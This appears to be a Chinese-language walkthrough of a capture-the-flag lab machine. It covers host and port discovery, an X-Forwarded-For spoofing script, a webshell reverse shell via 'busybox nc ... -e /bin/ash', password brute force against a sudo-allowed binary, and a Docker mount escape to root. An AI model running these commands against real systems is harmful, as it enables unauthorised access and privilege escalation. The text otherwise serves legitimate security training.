# **一、信息收集**

## **1. 主机发现**

首先在本地网络中使用 `arp-scan` 扫描本地网络，以确定目标主机的IP地址。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.146        08:00:27:39:c8:97       PCS Systemtechnik GmbH
...
```

从扫描结果可知，目标靶机的IP地址为 `192.168.205.146`。

## **2. 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.146
...
0/tcp open  unknown
...
```

0端口是不允许浏览器访问的，所以转发一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ socat TCP-LISTEN:8000,fork TCP4:192.168.205.146:0 &    
[1] 23767
```

# **二、漏洞发现与初始访问**

## 1.Web

访问本地8000端口

![image-20250815112328650](http://7r1UMPHK.github.io/image/20250815213356794.webp)

尝试curl助力链接显示助力成功，并且重新curl显示助力过了，应该是存在IP检测的问题。测试发现，该IP检测只检测IP地址的前16位，即 `x.x.1.1` 格式即可，那写批量助力脚本。

```perl
perl -MLWP::UserAgent -e '$ua=LWP::UserAgent->new(timeout=>1);for $i (0..255){for $j (0..255){$ip="$i.$j.1.1";$ua->get("http://192.168.205.128:8000/support?token=eb0c6310-07b2-4609-9f3e-4a59ce09949a","X-Forwarded-For"=>$ip);print "$ip\n";}}'
```

在脚本执行完成后，再次访问Web服务，发现之前隐藏的页面是Webshell。

## **2. 获取反弹Shell**

通过新出现的Webshell界面，我们执行反弹shell命令。由于目标系统为 Alpine Linux，它默认不包含 `bash`，因此我们使用 `busybox` 内置的 `nc` 和 `ash` 来获取反弹shell。

**本地Kali开启监听:**

```bash
nc -lvnp 8888
```

**在Webshell中执行Payload:**

```bash
busybox nc 192.168.205.128 8888 -e /bin/ash
```

执行后，在本地 `8888` 端口成功接收到 `runner` 用户的交互式Shell。

## **3. 稳定Shell**

```
python3 -c 'import pty; pty.spawn("/bin/ash")'
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/ash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. runner -> luna**

获取初步Shell后，执行 `sudo -l` 查看当前用户的 `sudo` 权限。

```bash
/opt/web $ sudo -l
...
User runner may run the following commands on tcpraiders:
    (luna) NOPASSWD: /usr/sbin/luna
```

结果显示 `runner` 用户可以免密以 `luna` 用户身份运行 `/usr/sbin/luna` 程序。

尝试执行该程序，发现它会输出一段反向的英文字符串，并等待输入。

```bash
/opt/web $ sudo -u luna /usr/sbin/luna
.yranoitcid eht ni semit 511 dnuof neeb sah tI .kaew oot si drowssap ruoY :TRELA

# 使用rev命令反转字符串
/opt/web $ sudo -u luna /usr/sbin/luna | rev
ALERT: Your password is too weak. It has been found 115 times in the dictionary.
```

这明显是一个密码验证程序。程序逻辑可能是将用户输入与某个正确密码进行比较。考虑到提示信息，该程序可能将用户的输入进行反向处理。因此，我们需要一个反向的字典进行爆破。

我们使用 `rockyou.txt` 字典，将其整本反转后，通过管道符和循环来爆破密码。

```bash
# 在/tmp目录准备反转后的字典
cd /tmp
wget http://192.168.205.128/rockyou.txt
rev rockyou.txt > pass

# 执行爆破脚本
echo 'hold on...' && while read p; do echo "$p" | sudo -u luna /usr/sbin/
luna | grep -q tcerrocnI || { echo "[+] Found: $p"; break; }; done < pass
hold on...
/tmp $ 
[+] Found: ebyam
```

成功找到密码为 `ebyam`。现在，我们执行 `/usr/sbin/luna` 并输入该密码，成功切换到 `luna` 用户。

```bash
/opt $ sudo -u luna /usr/sbin/luna
 drowssaP: ebyam
/opt $ id
uid=1001(luna) gid=1001(luna) groups=1001(luna)
```

## **2. luna -> root**

在 `luna` 用户的shell中，再次执行 `sudo -l`。

```bash
/opt $ sudo -l
...
User luna may run the following commands on tcpraiders:
    (ALL) NOPASSWD: /usr/bin/docker build *, /usr/bin/docker run *
```

发现 `luna` 用户可以免密以 `root` 权限执行任意 `docker build` 和 `docker run` 命令。这是一个典型的提权路径。由于靶机可以访问外网，我们可以直接拉取一个镜像来利用。

我们利用 `docker run` 命令，将宿主机的根目录 `/` 挂载到容器的 `/mnt` 目录，然后在容器内执行 `chroot /mnt`，从而获得宿主机的 `root` shell。

```bash
/opt $ sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
...
Status: Downloaded newer image for alpine:latest
/ # id
uid=0(root) gid=0(root) groups=0(root),...
```

成功获取 `root` 权限。最后，读取位于用户目录和 `root` 目录下的 flag 文件。

```bash
/ # cat /root/root.flag /home/luna/user.flag
flag{641d35852cd6fdaab8a6a621d40c3d5ac2b453aa}
flag{1b925e677f649ce856f61e3846466252e75cc179}
```

